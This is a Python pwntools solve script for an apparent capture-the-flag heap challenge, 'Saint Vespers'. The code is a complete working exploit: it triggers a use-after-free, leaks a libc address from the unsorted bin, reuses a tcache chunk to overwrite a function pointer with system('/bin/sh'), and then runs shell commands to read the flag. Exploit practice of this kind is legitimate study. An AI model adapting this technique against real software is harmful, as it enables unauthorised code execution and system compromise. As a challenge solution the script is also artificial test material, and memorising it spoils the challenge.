#!/usr/bin/env python3
"""Saint Vespers: UAF dangling choir slot → unsorted leak → sing=system.

Usage:
    python3 solve.py              # local, bundled glibc 2.35
    python3 solve.py REMOTE       # 10.0.190.59:5000
    python3 solve.py REMOTE HOST=... PORT=...
"""
from __future__ import annotations

import pathlib

from pwn import ELF, args, context, flat, log, process, remote, u64

HERE = pathlib.Path(__file__).resolve().parent
FILES = HERE.parent / "files"
BIN = FILES / "vespers"
LIBC_PATH = FILES / "libc.so_3.6"
LD = FILES / "ld-2.35.so"

context.binary = ELF(str(BIN), checksec=False)
context.arch = "amd64"
libc = ELF(str(LIBC_PATH), checksec=False)

HOST = args.HOST or "10.0.190.59"
PORT = int(args.PORT or 5000)
# glibc 2.35 bundled: unsorted-bin fd == libc+0x21ace0
UNSORTED_OFF = 0x21ACE0


def start():
    if args.REMOTE:
        return remote(HOST, PORT)
    return process(
        [str(LD), "--library-path", str(FILES), str(BIN)],
        cwd=str(FILES),
    )


def menu(io, n):
    io.sendlineafter(b"> ", str(n).encode())


def recruit(io, name, style, tlen, data):
    menu(io, 1)
    io.sendlineafter(b"Name this chorister: ", name)
    io.sendlineafter(b"hymn style", str(style).encode())
    io.sendlineafter(b"Transcript length", str(tlen).encode())
    io.sendafter(b"raw bytes): ", data)


def retire(io, idx):
    menu(io, 2)
    io.sendlineafter(b"Retire which seat? ", str(idx).encode())


def restore(io, idx):
    menu(io, 3)
    io.sendlineafter(b"Restore which seat? ", str(idx).encode())


def exploit(io):
    recruit(io, b"leak", 0, 0x500, b"L" * 0x500)
    recruit(io, b"one", 0, 0x20, b"1" * 0x20)
    recruit(io, b"two", 0, 0x20, b"2" * 0x20)

    retire(io, 0)
    restore(io, 0)
    menu(io, 5)
    io.sendlineafter(b"Recite which seat? ", b"0")
    io.recvuntil(b"):\n")
    leak = io.recvn(8)
    io.recvuntil(b"> ")
    io.unrecv(b"> ")

    unsorted = u64(leak)
    libc.address = unsorted - UNSORTED_OFF
    log.info("unsorted %#x libc %#x system %#x", unsorted, libc.address, libc.sym["system"])
    if libc.address & 0xFFF:
        raise SystemExit(f"bad libc leak {unsorted:#x}")

    # 0x58 transcript shares the 0x60 tcache with chorister_t.
    # First, park the dangling leak seat as archived (active=0) so Final
    # Performance does not call a non-endbr64 sing under IBT.
    quiet = flat({0x00: b"QQQQQQQQ", 0x38: libc.sym["puts"], 0x50: 0}, length=0x58)
    win = flat(
        {
            0x00: b"/bin/sh\x00",
            0x38: libc.sym["system"],
            0x40: 0,
            0x48: 8,
            0x50: 1,
        },
        length=0x58,
    )
    recruit(io, b"pad", 0, 0x58, quiet)
    retire(io, 1)
    retire(io, 2)
    recruit(io, b"win", 0, 0x58, win)

    menu(io, 8)
    io.sendline(b"cat flag.txt; echo; id; ls")
    data = io.recvrepeat(4)
    print(data.decode("latin1", "replace"))
    return data


def main():
    io = start()
    try:
        exploit(io)
    finally:
        io.close()


if __name__ == "__main__":
    main()
